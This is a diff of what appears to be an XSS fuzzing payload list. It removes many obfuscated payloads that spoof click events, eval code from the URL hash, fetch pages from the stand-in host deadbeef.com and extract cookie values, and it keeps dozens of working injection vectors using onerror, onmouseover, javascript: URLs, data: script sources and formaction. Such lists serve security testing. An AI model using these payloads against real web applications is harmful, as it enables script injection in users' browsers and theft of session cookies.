@@ -8,24 +8,8 @@
 "><iframe%20src="http://deadbeef.com"%%203E
 '<script>window.onload=function(){document.forms[0].message.value=confirm(0xdeadbeef);}</script>
 x”</title><img src%3dx onerror%3dalert(0xdeadbeef)>
-<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%30%78%64%65%61%64%62%65%65%66%2b%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
-<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22dsafe123%22).click=function()+{alert(0xdeadbeef+Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
-<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get(%22safe123%22));};document.getElementById(%22safe123%22).click(test);'><source>%23
-<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(0xdeadbeef+get());})();};safe123.click();</script>#
-<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://deadbeef.com', true);xhr.onload = function() { alert(0xdeadbeef+xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
-<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(0xdeadbeef+ta.value.match(/cookie = '(.*?)'/)[1])</script>
-<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fdeadbeef.com%252F%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(0xdeadbeef+xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
-<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://deadbeef.com', true);xhr.onload = function() { alert(0xdeadbeef+xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
-<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(0xdeadbeef+ta.value.match(/cookie = '(.*?)'/)[1])</script>
-<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://deadbeef.com', true);xhr.onload = function() { alert(0xdeadbeef+xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<%73%63%72%69%70%74>%61%6c%65%72%74(%30%78%64%65%61%64%62%65%65%66%29</%73%63%72%69%70%74>
 <textarea id=ta onfocus=%22write('<script>alert(0xdeadbeef)</script>')%22 autofocus></textarea>
-<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://deadbeef.com', true);xhr.onload = function() { alert(0xdeadbeef+xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
-%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22deadbeef.com/%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%280xdeadbeef+xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
-<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/deadbeef',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(alert%280xdeadbeef+xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
-<a target="x" href="deadbeef.com?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%280xdeadbeef+top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
-<a target="x" href="deadbeef.com?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(0xdeadbeef+result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
-<a target="x" href="deadbeef.com?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(0xdeadbeef+xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
-Garethy Salty Method!<script>alert(0xdeadbeef+Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
 <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;0xdeadbeef&rpar;"><button>
 <div onmouseover='alert&lpar;0xdeadbeef&rpar;'>DIV</div>
 <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(0xdeadbeef)">
@@ -63,8 +47,8 @@ http://www.<script>alert(0xdeadbeef)</script .com
 <script x> alert(0xdeadbeef) </script 1=2
 <div/onmouseover='alert(0xdeadbeef)'> style="x:">
 <--`<img/src=` onerror=alert(0xdeadbeef)> --!>
-<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(0xdeadbeef)></script> ?
-<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(0xdeadbeef)">x</button>?
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(0xdeadbeef)></script>
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(0xdeadbeef)">x</button>
 "><img src=x onerror=window.open('https://www.deadbeef.com/');>
 <form><button formaction=javascript&colon;alert(0xdeadbeef)>CLICKME
 <math><a xlink:href="//deadbeef.com/">click
